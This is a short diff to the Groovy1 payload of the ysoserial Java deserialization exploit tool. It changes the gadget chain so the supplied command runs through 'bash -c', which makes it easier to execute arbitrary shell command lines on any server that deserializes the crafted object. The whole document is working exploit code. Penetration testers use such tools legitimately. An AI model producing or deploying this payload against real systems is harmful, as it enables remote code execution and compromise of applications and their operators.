@@ -32,7 +32,7 @@ import ysoserial.payloads.util.PayloadRunner;
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
 	public InvocationHandler getObject(final String command) throws Exception {
-		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
+		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(new String[] {"bash", "-c", command}, "execute"), "entrySet");
 
 		final Map map = Gadgets.createProxy(closure, Map.class);
 
